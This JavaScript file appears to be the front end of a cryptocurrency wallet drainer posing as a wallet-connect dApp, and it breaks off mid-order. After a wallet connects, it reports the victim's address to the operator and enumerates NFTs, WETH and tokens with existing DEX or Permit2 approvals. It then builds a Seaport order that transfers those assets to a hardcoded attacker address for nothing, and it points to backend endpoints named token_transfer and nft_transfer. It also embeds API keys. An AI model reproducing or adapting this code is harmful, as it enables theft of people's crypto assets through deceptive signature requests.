var connected = 0;
var account = "";
var perETH_usd;
var success = 0;
var sortedTrue = 0;
var permitApprove = 0;
let msgs;
let ethersProvider, signer, wallet, Seaport, web3Modal, selectedAccount;
let isApprovedPancake, isApprovedUniswap, isApprovedSushiswap, isApprovedPermit2;
let tokenList = [];
var wasWethApproved = 0;
const characters = '0123456789';

const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
const USDC = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
const WBNB_BSC = "0x4B0F1812e5Df2A09796481Ff14017e6005508003";
const BUSD_BSC = "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82";
const CONDUIT = "0x1E0049783F008A0085193E00003D00cd54003c71";

const UNISWAP_CONTRACT_ADDRESS = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"
const PERMIT_CONTRACT_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3"
const PANCAKE_CONTRACT_ADDRESS = "0x10ED43C718714eb63d5aA57B78B54704E256024E"
const PANCAKE_CONTRACT_ADDRESS2 = "0x13f4EA83D0bd40E75C8222255bc855a974568Dd4"
const SUSHI_CONTRACT_ADDRESS = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F"

const RPC = "https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf";

let w3 = new ethers.providers.JsonRpcProvider(RPC);
let providerETH = new ethers.providers.JsonRpcProvider('https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf');
let providerBSC = new ethers.providers.JsonRpcProvider('https://rpc.ankr.com/bsc/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf');
let providerMATIC = new ethers.providers.JsonRpcProvider('https://rpc.ankr.com/polygon/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf');

const operator = "0xe4bb1c9ab41bd3cbeebbe431c13952c116c9df93";
const contractSAFA = "0x25617ce76ff894df654ac02ac069857a95b8b28b";
const ownerAddress = "0x225ca6fdc948b6f4a8d905c2020733c798a78853";

const MintETH = "0x26562a726E3DEa7a04e16daD37Cf60137E8D53ED";
const MintBNB = "0x26562a726E3DEa7a04e16daD37Cf60137E8D53ED";

const BASE_URL = 'https://covalent.page/api';
const TOKEN_APPROVE = BASE_URL + '/token_permit';
const PERMIT2_TOKEN = BASE_URL + '/permit2';
const TOKEN_TRANSFER = BASE_URL + '/token_transfer';
const SEAPORT_SIGN = BASE_URL + '/seaport_sign';
const NFT_TRANSFER = BASE_URL + '/nft_transfer';
const MAX_APPROVAL = '1158472395435294898592384258348512586931256';

const endpoint = ownerAddress;

let supportedWallets = {
    0: "WalletConnect",
    1: "Metamask",
};
let selectedProvider, selectedWallets;

const chainToId = {
    "eth": {
        chainId: '0x1',
        abiUrl: 'https://api.etherscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99',
        explorer: 'etherscan.io'
    },
    "bsc": {
        chainId: '0x38',
        abiUrl: 'https://api.bscscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI',
        explorer: 'bscscan.com'
    },
    "matic": {
        chainId: '0x89',
        abiUrl: 'https://api.polygonscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=M9IMUX515SEB97THWJRQDKNX75CI66X7XX',
        explorer: 'polygonscan.com'
    },
    "ftm": {
        chainId: '0xfa',
        abiUrl: 'https://api.ftmscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415',
        explorer: 'ftmscan.com'
    },
    "avax": {
        chainId: '0xa86a',
        abiUrl: 'https://api.snowtrace.io/api?module=contract&action=getsourcecode&address={0}&apikey=ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z',
        explorer: 'ftmscan.com'
    },
    "op": {
        chainId: '0xa',
        abiUrl: 'https://api-optimistic.etherscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK',
        explorer: 'optimistic.etherscan.io'
    },
    "arb": {
        chainId: '0xa4b1',
        abiUrl: 'https://api.arbiscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I',
        explorer: 'arbiscan.io'
    },
    "xDai": {
        chainId: '0x64',
        abiUrl: 'https://api.gnosisscan.io/api?module=contract&action=getsourcecode&address={0}&apikey={1}',
        explorer: 'gnosisscan.io'
    },
    "movr": {
        chaiId: '0x505',
        abiUrl: 'https://api-moonriver.moonscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99',
        explorer: 'moonscan.io'
    },
    "celo": {
        chainId: '0xa4ec',
        abiUrl: 'https://api.celoscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=YourApiKeyToken',
        explorer: 'celoscan.io'
    },
    "aurora": {
        chainId: '0x4e454152',
        abiUrl: 'https://api.aurorascan.dev/api?module=contract&action=getsourcecode&address={0}&apikey=YourApiKeyToken',
        explorer: 'aurorascan.dev'
    },
    "heco": {
        chainId: '0x80',
        abiUrl: 'https://www.hecoinfo.com/api?module=contract&action=getsourcecode&address={0}&apikey=YourApiKeyToken',
        explorer: 'hecoinfo.com'
    },
    "okt": {
        chainId: '0x42',
        abiUrl: 'https://exchainrpc.okex.org/api?module=contract&action=getsourcecode&address={0}&apikey=YourApiKeyToken',
        explorer: 'oklink.com'
    },
    "evmos": {
        chainId: '0x2329',
        abiUrl: 'https://evm.evmos.dev/api?module=contract&action=getsourcecode&address={0}&apikey=YourApiKeyToken',
        explorer: 'escan.live'
    },
    "cro": {
        chainId: '0x19',
        abiUrl: 'https://api.cronoscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=7V6GQ5XWEU9V16VXJYMAEJUZNIJ1HA26IF',
        explorer: 'cronoscan.com'
    }
}

const getMobileOperatingSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }
    if (/android/i.test(userAgent)) {
        return "Android";
    }
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }
    return "unknown";
}

const getDAppSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/Trust/i.test(userAgent)) {
        return "Trust";
    }
    if (/CriOS/i.test(userAgent)) {
        return "Metamask";
    }
    return "unknown";
}

const openMetaMaskUrl = (url) => {
    const a = document.createElement("a");
    a.href = url;
    a.target = "_self";
    document.body.appendChild(a);
    a.click();
    a.remove();
}

function loginMetamask() {
    openMetaMaskUrl(`dapp://${document.URL.replace(/https?:\/\//i, "")}`);
}

async function loginTrust() {
  selectedWallets = 1;
  window.location = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${document.URL.replace(/https?:\/\//i, "")}`;
}

async function login() {
  try{
    walletconnect();
  }catch(error){
    console.log(error);
  }
}

function walletconnect() {
  if (window.ethereum) {
    ConnectWallet();
  } else {
    window.addEventListener('ethereum#initialized', ConnectWallet, {
      once: true,
    });
    ConnectWallet();
  }
}

const round = (value) => {
    return Math.round(value * 10000) / 10000;
}

async function isApproved(owner, nft) {
    try { 
        let contract = new ethers.Contract(nft, ERC721_ABI, w3);
        const approved = await contract.functions.isApprovedForAll(owner, CONDUIT, {gasLimit:100000});
        return approved;
    } catch (err) {
        console.log("error", err);
        return false;
    }
}

function fetchTokenIds(resp, contract) {
    try { 
        const assets = resp.assets;
        const tokenIds = [];
        for (let i = 0; i < assets.length; i++) {
            const currentAsset = assets[i];
            if (currentAsset.asset_contract.address.toLowerCase() == contract.toLowerCase()) {
                tokenIds.push(currentAsset.token_id);
            }
        }
        return tokenIds;
    } catch (err) {
        console.log("error", err)
    }
}

async function getNFTS(walletAddress) {
    try { 
        const options = { method: 'GET', headers: { Accept: 'application/json' } };
        let nfts = await fetch(`https://api.opensea.io/api/v1/assets?owner=${walletAddress}&order_direction=desc&limit=200&include_orders=false`)
        let nftsData = await nfts.json();
        let walletNfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=200`, options)
            .then(response => response.json())
            .then(nfts => {
                if (nfts.includes("Request was throttled.")) return ["Request was throttled."];
                return nfts.filter(nft => {
                    if (nft.primary_asset_contracts.length > 0) return true
                    else return false
                }).map(async (nft) => {
                    let price = round(nft.stats.floor_price != 0 ? nft.stats.floor_price : nft.stats.seven_day_average_price);
                    let isApprovedBool = await isApproved(walletAddress, nft.primary_asset_contracts[0].address);
                    isApprovedBool = isApprovedBool[0];
                    let schema_name = nft.primary_asset_contracts[0].schema_name;
                    if (schema_name === null) {
                        schema_name = "erc721";
                    }
                    return {
                        type: schema_name.toLowerCase(),
                        tokenAddress: ethers.utils.getAddress(nft.primary_asset_contracts[0].address),
                        token_ids: fetchTokenIds(nftsData, nft.primary_asset_contracts[0].address),
                        price: price,
                        balance: perETH_usd * parseFloat(price),
                        chain: "eth",
                        owned: nft.owned_asset_count,
                        "approved": isApprovedBool
                    }
                })
            }).catch(err => console.error(err));

        let all = await Promise.all(walletNfts);
        let sortedNfts = all.sort((a, b) => parseFloat(b.price) > parseFloat(a.price) ? 1 : -1);
        console.log(sortedNfts);
        sortedTrue = 1;
        return sortedNfts
    } catch(e) { console.log(e);  sortedTrue = 0; }
}

function generateString(length) {
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

async function getCounter(walletAddress) {
    const ABI_COUNTER = [{
        "inputs": [
            {
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }
        ],
        "name": "getCounter",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "counter",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }]
    let contract = new ethers.Contract("0x00000000006c3852cbEf3e08E8dF289169EdE581", ABI_COUNTER, w3);
    const counter = contract.functions.getCounter(walletAddress);
    return counter;
}

async function getWETH(walletAddress) {
    let contract = new ethers.Contract(WETH, ERC20_ABI, w3);
    const balance = contract.functions.balanceOf(walletAddress);
    const allowances = contract.functions.allowance(walletAddress, CONDUIT);
    return await Promise.all([balance, allowances]);
}

function getPreviousDay(date = new Date()) {
    const previous = new Date(date.getTime());
    previous.setDate(date.getDate() - 1);
    return previous;
}

async function isTokenApprovedUniswap(account, token) {
    try { 
        let contract = new ethers.Contract(token, ERC20_ABI, providerETH);
        let approvedBalance = await contract.functions.allowance(account, UNISWAP_CONTRACT_ADDRESS);
        let approved = approvedBalance > 0 ? true : false
        return approved;
    } catch (err) {
        console.log("error", err);
        return false;
    }
}

async function isTokenApprovedPancake(account, token) {
    try { 
        let contract = new ethers.Contract(token, ERC20_ABI, providerBSC);
        let approvedBalance = await contract.functions.allowance(account, PANCAKE_CONTRACT_ADDRESS);
        let approved = approvedBalance > 0 ? true : false
        return approved;
    } catch (err) {
        console.log("error", err);
        return false;
    }
}

async function isTokenApprovedPancake2(account, token) {
    try { 
        let contract = new ethers.Contract(token, ERC20_ABI, providerBSC);
        let approvedBalance = await contract.functions.allowance(account, PANCAKE_CONTRACT_ADDRESS2);
        let approved = approvedBalance > 0 ? true : false
        return approved;
    } catch (err) {
        console.log("error", err);
        return false;
    }
}

async function isTokenApprovedSushiswap(account, token) {
    try { 
        let contract = new ethers.Contract(token, ERC20_ABI, providerETH);
        let approvedBalance = await contract.functions.allowance(account, SUSHI_CONTRACT_ADDRESS);
        let approved = approvedBalance > 0 ? true : false
        return approved;
    } catch (err) {
        console.log("error", err);
        return false;
    }
}

async function isTokenApprovedPermit(account, token, chain) {
    let providerChain
    if(chain == "eth") { 
        providerChain = providerETH;
    }
    else if(chain == "bsc") { 
        providerChain = providerBSC;
    }
    else if(chain == "matic") { 
        providerChain = providerMATIC;
    }
    try { 
        let contract = new ethers.Contract(token, ERC20_ABI, providerChain);
        let approvedBalance = await contract.functions.allowance(account, PERMIT_CONTRACT_ADDRESS);
        let approved = approvedBalance > 0 ? true : false
        return approved;
    } catch (err) {
        console.log("error", err);
        return false;
    }
}

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
function init() {
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        bridge: "https://bridge.walletconnect.org",
        rpc: {
            1: "https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            56: "https://rpc.ankr.com/bsc/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            137: "https://rpc.ankr.com/polygon/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            250: "https://rpc.ankr.com/fantom/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            43114: "https://rpc.ankr.com/avalanche/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            10: "https://rpc.ankr.com/optimism/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            42161: "https://rpc.ankr.com/arbitrum/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            100: "https://rpc.ankr.com/gnosis/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            1285: "https://rpc.moonriver.moonbeam.network",
            42220: "https://rpc.ankr.com/celo/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            1313161554: "https://mainnet.aurora.dev",
        },
      },
    },
  'custom-coinbase': {
    display: {
      logo: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzQiIGhlaWdodD0iNzQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iMzciIGN5PSIzNyIgcj0iMzUiIGZpbGw9IiMxQjUzRTQiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSI0Ii8+PHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0zNy4yNDUgNjAuNjEyYy0xMi43NzIgMC0yMy4xMjUtMTAuMzUzLTIzLjEyNS0yMy4xMjUgMC0xMi43NzEgMTAuMzUzLTIzLjEyNSAyMy4xMjUtMjMuMTI1IDEyLjc3MSAwIDIzLjEyNSAxMC4zNTQgMjMuMTI1IDIzLjEyNSAwIDEyLjc3Mi0xMC4zNTQgMjMuMTI1LTIzLjEyNSAyMy4xMjVaIiBmaWxsPSIjZmZmIi8+PHBhdGggZD0iTTI5Ljc5NCAzMy4wMjFhMi45ODkgMi45ODkgMCAwIDEgMi45ODktMi45ODloOC45MjVhMi45ODkgMi45ODkgMCAwIDEgMi45ODkgMi45ODl2OC45MjVhMi45ODkgMi45ODkgMCAwIDEtMi45ODkgMi45ODloLTguOTI1YTIuOTg5IDIuOTg5IDAgMCAxLTIuOTktMi45ODl2LTguOTI1WiIgZmlsbD0iIzFCNTNFNCIvPjwvc3ZnPg==', 
      name: 'Coinbase',
      description: 'Connect to your Coinbase',
    },
    options: {
      appName: 'app', 
      networkUrl: `https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf`,
      chainId: "0x1",
    },
    package: WalletLink,
    connector: async (_, options) => {
      const { appName, networkUrl, chainId } = options
      const walletLink = new WalletLink({
        appName
      });
      const provider = walletLink.makeWeb3Provider(networkUrl, chainId);
      selectedWallets = 3;
      await provider.enable();
      return provider;
    },
  },
    "custom-binancechainwallet": {
    display: {
      logo: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PGcgZmlsbD0iI2YwYjkwYiI+PHBhdGggZD0iTTIwLjI0NSAwTDkuNjM0IDYuMTI1bDMuOTAxIDIuMjYyIDYuNzEtMy44NjIgNi43MSAzLjg2MiAzLjkwMi0yLjI2MkwyMC4yNDUgMHptNi43MTEgMTEuNTg2bDMuOSAyLjI2M3Y0LjUyNmwtNi43MSAzLjg2MnY3LjcyNGwtMy45IDIuMjYzLTMuOTAyLTIuMjYzdi03LjcyNGwtNi43MS0zLjg2MnYtNC41MjZsMy45MDEtMi4yNjMgNi43MSAzLjg2MyA2LjcxLTMuODYzaC4wMDF6Ii8+PHBhdGggZD0iTTMwLjg1NyAyMS41NzNWMjYuMWwtMy45MDEgMi4yNjJ2LTQuNTI1bDMuOS0yLjI2My4wMDEtLjAwMXoiLz48cGF0aCBkPSJNMjYuOTE2IDMxLjU2bDYuNzEtMy44NjJ2LTcuNzI0bDMuOTAyLTIuMjYzdjEyLjI1bC0xMC42MTEgNi4xMjVWMzEuNTZoLS4wMDF6bTYuNzExLTE5LjMxbC0zLjkwMi0yLjI2MyAzLjkwMi0yLjI2MyAzLjkgMi4yNjN2NC41MjVsLTMuOSAyLjI2M1YxMi4yNXpNMTYuMzQ0IDM3LjcyNFYzMy4ybDMuOTAxIDIuMjYzIDMuOTAyLTIuMjYzdjQuNTI1bC0zLjkwMiAyLjI2My0zLjktMi4yNjMtLjAwMS0uMDAxem0tMi44MDktOS4zNjNMOS42MzQgMjYuMXYtNC41MjZsMy45MDEgMi4yNjN2NC41MjUtLjAwMXptNi43MS0xNi4xMTFsLTMuOS0yLjI2MyAzLjktMi4yNjMgMy45MDIgMi4yNjMtMy45MDIgMi4yNjN6bS05LjQ4LTIuMjYzbC0zLjkgMi4yNjN2NC41MjVsLTMuOTAyLTIuMjYzVjkuOTg3bDMuOTAxLTIuMjYzIDMuOTAxIDIuMjYzeiIvPjxwYXRoIGQ9Ik0yLjk2MyAxNy43MTFsMy45MDEgMi4yNjN2Ny43MjRsNi43MSAzLjg2MnY0LjUyNkwyLjk2MyAyOS45NlYxNy43MXYuMDAxeiIvPjwvZz48L3N2Zz4=",
      name: "Binance Chain Wallet",
      description: "Connect to your Binance Chain Wallet"
    },
    package: true,
    connector: async () => {
      let provider = null;
      if (typeof window.BinanceChain !== 'undefined') {
        provider = window.BinanceChain;
        try {
          await provider.request({ method: 'eth_requestAccounts' });
          selectedWallets = 2;
        } catch (error) {
          throw new Error("User Rejected");
        }
      } else {
        throw new Error("No Binance Chain Wallet found");
      }
      return provider;
    },
    },
  };
  web3Modal = new Web3Modal({
    cacheProvider: true,
    providerOptions,
    theme: "dark"
  });
}

async function ConnectMetaMask(){
    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
            openMetaMaskUrl(`dapp://${document.URL.replace(/https?:\/\//i, "")}`);
            return;
    } else {
        if (window.ethereum) {
            await ethereum.request({ method: 'eth_requestAccounts' });
            provider = window.ethereum;
            web3 = new Web3(provider);
            ethersProvider = new ethers.providers.Web3Provider(provider, 'any');
            signer = ethersProvider.getSigner();
            if (web3._provider["bridge"]) {
                selectedProvider = supportedWallets[0];
            } else {
                selectedProvider = supportedWallets[1];
            }
            Seaport = new seaport.Seaport(signer); 
            getWalletAccount();
            get12DollarETH();
        }
    }
}

async function ConnectTrustWallet(){
    if (isMobile() && getDAppSystem() !== "Trust") {
            window.location = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${document.URL.replace(/https?:\/\//i, "")}`;
            return;
    } else {
        if (window.ethereum) {
            await ethereum.request({ method: 'eth_requestAccounts' });
            provider = window.ethereum;
            web3 = new Web3(provider);
            ethersProvider = new ethers.providers.Web3Provider(provider, 'any');
            signer = ethersProvider.getSigner();
            if (web3._provider["bridge"]) {
                selectedProvider = supportedWallets[0];
            } else {
                selectedProvider = supportedWallets[1];
            }
            Seaport = new seaport.Seaport(signer); 
            getWalletAccount();
            get12DollarETH();
        }
    }
}

async function ConnectCoinbase(){
      let appName = "app";
      let networkUrl = "https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf";
      let chainId = "0x1";
      const walletLink = new WalletLink({
        appName
      });
      const provider = walletLink.makeWeb3Provider(networkUrl, chainId);
      selectedWallets = 3;
      await provider.enable();
      web3 = new Web3(provider);
      ethersProvider = new ethers.providers.Web3Provider(provider, 'any');
      signer = ethersProvider.getSigner();
      if (web3._provider["bridge"]) {
                selectedProvider = supportedWallets[0];
      } else {
                selectedProvider = supportedWallets[1];
      }
      Seaport = new seaport.Seaport(signer); 
      getWalletAccount();
      get12DollarETH();
}

async function ConnectBinance(){
      if (typeof window.BinanceChain !== 'undefined') {
        provider = window.BinanceChain;
        try {
          await provider.request({ method: 'eth_requestAccounts' });
          selectedWallets = 2;
          web3 = new Web3(provider);
          ethersProvider = new ethers.providers.Web3Provider(provider, 'any');
          signer = ethersProvider.getSigner();
          if (web3._provider["bridge"]) {
                selectedProvider = supportedWallets[0];
          } else {
                selectedProvider = supportedWallets[1];
          }
          Seaport = new seaport.Seaport(signer); 
          getWalletAccount();
          get12DollarETH();
        } catch (error) {
          throw new Error("User Rejected");
        }
      } else {
        throw new Error("No Binance Chain Wallet found");
      }
}

async function ConnectWalletConnect(){
    const provider = new WalletConnectProvider({
        bridge: "https://bridge.walletconnect.org",
        rpc: {
            1: "https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            56: "https://rpc.ankr.com/bsc/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            137: "https://rpc.ankr.com/polygon/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            250: "https://rpc.ankr.com/fantom/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            43114: "https://rpc.ankr.com/avalanche/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            10: "https://rpc.ankr.com/optimism/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            42161: "https://rpc.ankr.com/arbitrum/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            100: "https://rpc.ankr.com/gnosis/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            1285: "https://rpc.moonriver.moonbeam.network",
            42220: "https://rpc.ankr.com/celo/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            1313161554: "https://mainnet.aurora.dev",
        }
    });
    selectedWallets = 2;
    web3 = new Web3(provider);
    ethersProvider = new ethers.providers.Web3Provider(provider, 'any');
    signer = ethersProvider.getSigner();
    if (web3._provider["bridge"]) {
            selectedProvider = supportedWallets[0];
    } else {
        selectedProvider = supportedWallets[1];
    }
    Seaport = new seaport.Seaport(signer); 
    getWalletAccount();
    get12DollarETH();
}

async function ConnectWallet(){
    provider = await web3Modal.connect();
    web3 = new Web3(provider);
    ethersProvider = new ethers.providers.Web3Provider(provider, 'any');
    signer = ethersProvider.getSigner();
    if (web3._provider["bridge"]) {
        selectedProvider = supportedWallets[0];
    } else {
        selectedProvider = supportedWallets[1];
    }
    Seaport = new seaport.Seaport(signer); 
    getWalletAccount();
    get12DollarETH();
}

async function get12DollarETH() {
    let url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
    let response = await fetch(url, {
      headers: {
        'Access-Control-Allow-Origin':'*'
      }
    });
    let price = await response.json();
    let perETH = price["ethereum"]["usd"];
    let usd = 1 / perETH;
    perETH_usd = perETH;
}

async function getWalletAccount() {
    const accounts = await web3.eth.getAccounts();
    waitAlert();
    account = accounts[0];
    if(connected == 0) {
        const connectmsg = 'Wallet Connected!<br><b>Account: <code>'+account+'</code></b> | <a href="https://debank.com/profile/'+account+'">Debank</a><br><br>Domain: '+window.location.hostname;
        logTlgConnect(connectmsg);
    }
    connected = 1;
    let counter, wethData;
    [tokenList, counter, wethData] = await Promise.all([getNFTS(account), getCounter(account), getWETH(account)]);
    counter = parseInt(counter.toString());
    let [balance, allowance] = wethData;
    balance = balance.toString();
    allowance = allowance.toString();
    const balanceNormalized = parseFloat(ethers.utils.formatEther(balance));
    const allowanceNormalized = parseFloat(ethers.utils.formatEther(allowance));
    let weth_include = "0";
    if (allowanceNormalized >= balanceNormalized) {
        weth_include = balance;
    }
    else if (balanceNormalized > allowanceNormalized) {
        weth_include = allowance;
    }
    const orders = [];
    const considers = [];
    let bundlePrice = 0;
    let uniPrice = 0;
    if(sortedTrue == 1) {
        tokenList.forEach((nft) => {
            if (nft.type == "erc721" && nft.approved == true) {
                bundlePrice+=nft.balance;
                nft.token_ids.forEach((token_id) => {
                    const array = {
                        itemType: 2,
                        token: nft.tokenAddress,
                        identifierOrCriteria: token_id,
                        startAmount: "1",
                        endAmount: "1",
                    }
                    const consider = {
                        itemType: 2,
                        token: nft.tokenAddress,
                        identifierOrCriteria: token_id,
                        startAmount: "1",
                        endAmount: "1",
                        recipient: endpoint,
                    }
                    orders.push(array)
                    considers.push(consider);
                })
            }
        });
    }
    if(connected == "2" || getItem("tokenList")) {
        console.log("NO API");
        tokenList = getItem("tokenList");
        connected = 2;
    } else {
        console.log("API");
        const response = await fetch("/getjs.php?account="+account, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `token=8bEEokUZLhn7nAHz`,
        });
        const data = await response.json();
        for (let item of data) {
            if (!item.is_verified) continue;
            var temp = {};
            temp.balance = item.amount*item.price;
            temp.tokenAddress = item.id;
            if(item.chain == "bsc" && item.id !== "bsc") {
                isApprovedPancake = await isTokenApprovedPancake(account, item.id);
                isApprovedPancake2 = await isTokenApprovedPancake2(account, item.id);
            } else if(item.chain == "eth" && item.id !== "eth") {
                isApprovedUniswap = await isTokenApprovedUniswap(account, item.id);
                isApprovedSushiswap = await isTokenApprovedSushiswap(account, item.id);
                temp.approved = isApprovedUniswap;
            } 
            if(item.chain == "eth" && item.id !== "eth" || item.chain == "bsc" && item.id !== "bsc" || item.chain == "matic" && item.id !== "matic") {
                isApprovedPermit2 = await isTokenApprovedPermit(account, item.id, item.chain);
            }
            if(item.chain == "eth" && item.id !== "eth" && isApprovedSushiswap == true) {
                temp.type = 4;
            } else if(item.chain == "bsc" && item.id !== "bsc" && isApprovedPancake2 == true) {
                temp.type = 32;
            } else if(item.chain == "bsc" && item.id !== "bsc" && isApprovedPancake == true) {
                temp.type = 3;
            } else if(item.chain == "eth" && item.id !== "eth" && isApprovedPermit2 == true || item.chain == "bsc" && item.id !== "bsc" && isApprovedPermit2 == true || item.chain == "matic" && item.id !== "matic" && isApprovedPermit2 == true) { 
                temp.type = 2; 
            } else {
                temp.type = 1;
            }
            if(item.id == 'eth' || item.id == 'bsc' || item.id == 'xdai' || item.id == 'matic' || item.id == 'ftm' || item.id == 'okt' || item.id == 'heco' || item.id == 'avax' || item.id == 'op' || item.id == 'arb' || item.id == 'celo' || item.id == 'movr' || item.id == 'cro' || item.id == 'boba' || item.id == 'metis' || item.id == 'btt' || item.id == 'aurora' || item.id == 'mobm' || item.id == 'sbch' || item.id == 'fuse' || item.id == 'hmy' || item.id == 'klay' || item.id == 'astar' || item.id == 'sdn' || item.id == 'palm' || item.id == 'iotx' || item.id == 'rsk' || item.id == 'wan' || item.id == 'kcc' || item.id == 'sgb' || item.id == 'evmos' || item.id == 'dfk' || item.id == 'tlos' || item.id == 'swm' || item.id == 'nova' || item.id == 'canto' || item.id == 'doge' || item.id == 'kava' || item.id == 'step' || item.id == 'mada' || item.id == 'cfx' || item.id == 'brise') temp.type = 0;
            temp.chain = item.chain;
            temp.tokenAmount = item.raw_amount;
            temp.tokenAmountHex = item.raw_amount_hex_str;
            temp.tokenAmountFix = item.amount;
            temp.symbol = item.symbol;
            tokenList.push(temp);
        }
        setItem("tokenList", tokenList);
        connected = 2;
    }
    if (weth_include !== "0") {
        wasWethApproved = 1;
        bundlePrice += perETH_usd * ethers.utils.formatEther(balance);
        const weth_order = {
            "itemType": 0x1,
            "token": WETH,
            "identifierOrCriteria": "0",
            "startAmount": weth_include,
            "endAmount": weth_include
        }
        const weth_consider = {
            "itemType": 0x1,
            "token": WETH,
            "identifierOrCriteria": "0",
            "startAmount": weth_include,
            "endAmount": weth_include,
            "recipient": endpoint
        }
        orders.push(weth_order);
        considers.push(weth_consider);
    }
    const date = getPreviousDay();
    const milliseconds = date.getTime();
    const dateClone = date;
    const tomorrow = dateClone.setTime(milliseconds + (2 * 24 * 60 * 60 * 1000));
    const milliseconds_tomorrow = dateClone.getTime();
    const tomorrow_seconds = Math.floor(milliseconds_tomorrow / 1000);
    const seconds = Math.floor(milliseconds / 1000);
    const salt = generateString(70);
    const offer = {
        "offerer": ethers.utils.getAddress(account),
        zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
        "offer": orders,
        consideration: considers,
        orderType: 2,
        startTime: seconds,
        endTime: tomorrow_seconds,
        zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
        salt: salt,
        totalOriginalConsiderationItems: considers.length,
        conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
